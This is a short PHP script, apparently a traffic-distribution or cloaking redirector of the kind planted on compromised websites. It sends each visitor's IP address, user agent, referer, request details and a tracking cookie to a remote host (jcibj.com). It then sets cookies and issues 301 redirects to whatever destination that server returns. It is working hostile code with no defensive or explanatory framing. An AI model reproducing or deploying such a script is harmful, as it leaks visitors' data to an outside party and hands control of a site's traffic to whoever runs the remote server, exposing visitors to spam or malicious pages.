<?php error_reporting(E_ALL & ~E_NOTICE);

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");

$id = "223109";
$uid="ab78zv8mo1yuh52s9ewkjrvcn";
$qu=$_SERVER["QUERY_STRING"];
$ch = curl_init();
$url = "http://jcibj.com/pcl.php";
$data=array("lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);

curl_setopt($ch,CURLOPT_URL, $url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch,CURLOPT_POST, true);
curl_setopt($ch,CURLOPT_POSTFIELDS, $data);
$result = curl_exec($ch);
curl_close($ch);
$arr = explode(",",$result);

if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}

if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="";}
if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9]);}
if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}
header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){
    if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){
        if($arr[4] == 2 OR $arr[4] == 3){
            setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}
    header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}
?>
